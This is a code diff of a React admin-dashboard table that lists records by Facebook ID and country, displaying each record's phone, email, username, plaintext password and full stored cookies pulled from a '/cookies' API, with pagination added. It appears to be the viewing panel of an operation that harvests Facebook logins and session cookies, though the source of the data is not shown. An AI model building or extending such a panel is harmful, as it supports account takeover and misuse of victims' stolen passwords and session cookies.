@@ -5,10 +5,12 @@ import paginationFactory from "react-bootstrap-table2-paginator";
 import axios from 'axios'
 import { BASE_URL } from '../../utils/config'
 import moment from 'moment'
+import PaginationPage from '../Pagination'
 
-const TableContainer = ({ page, perPage }) => {
+const TableContainer = ({ page, perPage, setPage, setPerPage }) => {
 
   const [data, setData] = useState([])
+  const [total, setTotal] = useState(0)
   const tableColumns = [
     {
       dataField: "facebookId",
@@ -24,9 +26,32 @@ const TableContainer = ({ page, perPage }) => {
       text: "Country",
     },
     {
+      dataField: "infoRegister",
+      text: "InfoRegister",
+      formatter: (cell) => {
+        return <div>
+          <p>{cell.phone ? `Phone: ${cell.phone}` : ""}</p>
+          <p>{cell.email ? `Email: ${cell.email}` : ""}</p>
+          <p>{cell.username ? `Username:${cell.username}` : ""}</p>
+          <p>{cell.password ? `Password:${cell.password}` : ""}</p>
+        </div>
+      }
+    },
+
+    // {
+    //   dataField: "facebookId",
+    //   text: "Avata",
+    //   formatter: (cell) => { return <span>{cell && <img src={`https://graph.facebook.com/${cell}/picture?type=square`} />}</span> }
+    // },
+    {
       dataField: "cookies",
       text: "Cookies",
+      formatter: (cell, row) => { return <div style={{ height: 300, overflowY: "auto" }}>{JSON.stringify(cell)}</div> },
+      headerStyle: (colum, colIndex) => {
+        return { width: '400px', textAlign: 'center' };
+      }
     },
+
     {
       dataField: "createdAt",
       text: "Time",
@@ -34,28 +59,35 @@ const TableContainer = ({ page, perPage }) => {
     },
 
   ];
-  const options = {
-    onSizePerPageChange: (sizePerPage, page) => {
-      console.log('Size per page change!!!');
-      console.log('Newest size per page:' + sizePerPage);
-      console.log('Newest page:' + page);
-    },
-    onPageChange: (page, sizePerPage) => {
-      console.log('Page change!!!');
-      console.log('Newest size per page:' + sizePerPage);
-      console.log('Newest page:' + page);
-    }
-  };
+  const token = localStorage.getItem("token")
+
   useEffect(() => {
-    const token = localStorage.getItem("token")
     const config = {
       headers: { Authorization: `Bearer ${token}` }
     };
-    axios.get(`${BASE_URL}/cookies?${page}=0&perPage=${perPage}`, config)
-      .then(res => setData(() => res.data.data))
+    axios.get(`${BASE_URL}/cookies?page=${page}&perPage=${perPage.value}`, config)
+      // .then(res => setData(() => res.data.data))
+      .then(res => {
+        setData(res.data.data.data)
+        setTotal(res.data.data.total)
+      })
+      .catch(err => console.log(err))
+  }, [])
+  useEffect(() => {
+    const config = {
+      headers: { Authorization: `Bearer ${token}` }
+    };
+    axios.get(`${BASE_URL}/cookies?page=${page}&perPage=${perPage.value}`, config)
+      // .then(res => setData(() => res.data.data))
+      .then(res => {
+        setData(res.data.data.data)
+
+      })
       .catch(err => console.log(err))
   }, [page, perPage])
-  console.log(data, "dsada")
+
+
+  console.log(data)
   return (
     <Card>
       <CardHeader>
@@ -66,12 +98,16 @@ const TableContainer = ({ page, perPage }) => {
       <CardBody>
         <BootstrapTable
           keyField="name"
-          data={data}
+          data={data ? data : []}
           columns={tableColumns}
           bootstrap4
           bordered={false}
-          pagination={paginationFactory(options)}
+          striped
+          hover
+          condensed
+        // pagination={paginationFactory(options)}
         />
+        <PaginationPage page={page} sizePerPage={perPage} setPage={setPage} setPerPage={setPerPage} total={total} />
       </CardBody>
     </Card>
   )
